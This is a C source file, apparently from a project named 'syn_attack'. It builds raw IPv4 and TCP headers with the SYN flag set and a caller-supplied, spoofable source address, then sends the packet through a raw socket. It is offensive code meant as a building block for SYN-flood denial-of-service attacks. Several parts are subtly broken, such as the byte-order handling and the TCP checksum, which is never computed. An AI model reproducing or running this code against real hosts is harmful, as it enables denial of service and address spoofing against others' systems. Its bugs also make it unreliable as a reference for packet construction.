#include "syn_attack.h"

static struct ip * ipv4_header_create(const char *src_addr, const char * dst_addr, int len)
{
      struct ip * ipv4_header;

      if (!(ipv4_header = (struct ip *) malloc(sizeof(struct ip))))
      {
            printf("Error: Malloc error\n");
            return NULL;
      }
      
      ipv4_header->ip_v = IPVERSION;
      ipv4_header->ip_hl = sizeof(struct ip) / 4;
      ipv4_header->ip_tos = 0;
      ipv4_header->ip_len = htons(len);
      ipv4_header->ip_id = 0;
      ipv4_header->ip_off = 0;
      ipv4_header->ip_ttl = MAXTTL;
      ipv4_header->ip_p = IPPROTO_TCP; // TCP
      ipv4_header->ip_sum = 0;
      ipv4_header->ip_src.s_addr = inet_addr(src_addr);
      ipv4_header->ip_dst.s_addr = inet_addr(dst_addr);

      ipv4_header->ip_sum = packet_checksum((u_int16_t *)ipv4_header, 10);
      
      return ipv4_header;
}

static struct tcphdr* tcphdr_create(const u_int16_t dst_port)
{
      struct tcphdr * tcp_header;

      if (!(tcp_header = (struct tcphdr *)malloc(sizeof(struct tcphdr))))
      {
            printf("Error: Malloc error\n");
            return NULL;
      }
      tcp_header->source = htons(SRC_PORT); 
      tcp_header->dest = htons(dst_port);
      tcp_header->doff = sizeof(struct tcphdr) / 4;
      tcp_header->syn = 1;  //SYN
     tcp_header->window = 4096;
      tcp_header->check = 0;
      return tcp_header;
}

static u_int16_t packet_checksum(u_int16_t *arr, size_t len)
{
      u_int32_t checksum = 0;

      u_int16_t * checksum_values = arr;

      int i = 0;
      while (i < len) 
      {
            checksum += *checksum_values++;
            while (checksum >> 16)
                  checksum += (checksum & 0xffff) + (checksum >> 16);
            i++;
      }
      
      
      return (~(u_int16_t) checksum);
}



int syn_attack_sock(const char * dst_addr, const char * src_addr, u_int16_t dst_port)
{

      struct ip * ipv4_header;
      struct tcphdr * tcp_header;
      struct sockaddr_in dstsock_addr;

      memset(&dstsock_addr, 0, sizeof(struct sockaddr_in));

      int sockaddr_in_len = sizeof(struct sockaddr_in);
      int sockfd, on = 1;

      char send_buff[P_SIZE];
      memset(send_buff, 0, sizeof(send_buff));
      
      dstsock_addr.sin_family = PF_INET;
      dstsock_addr.sin_addr.s_addr = inet_addr(dst_addr);
      dstsock_addr.sin_port = dst_port;


      if ((sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_TCP)) < 0)
      {
            printf("Error[socket()]: %s err_code: %d\n", strerror(errno), errno);
            return (-1);
      }
      
      if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0)
      {
            printf("Error[setsockopt()]: %s err_code: %d\n", strerror(errno), errno);
            return (-1);
      }
      
      ipv4_header = ipv4_header_create(src_addr, dst_addr, P_SIZE);
      tcp_header = tcphdr_create(dst_port);
      
      memcpy(send_buff, ipv4_header, sizeof(struct ip));
      memcpy(send_buff + sizeof(struct ip), tcp_header, sizeof(struct tcphdr));

      
      // Send syn packet
      int ret_len = sendto(sockfd, send_buff, P_SIZE, 0, (struct sockaddr *)&dstsock_addr, sockaddr_in_len);
      
      if (ret_len < 0) printf("Error[sendto()]: %s err_code: %d\n", strerror(errno), errno);
      
      free(ipv4_header);
      free(tcp_header);
      close(sockfd);
      return (ret_len);
}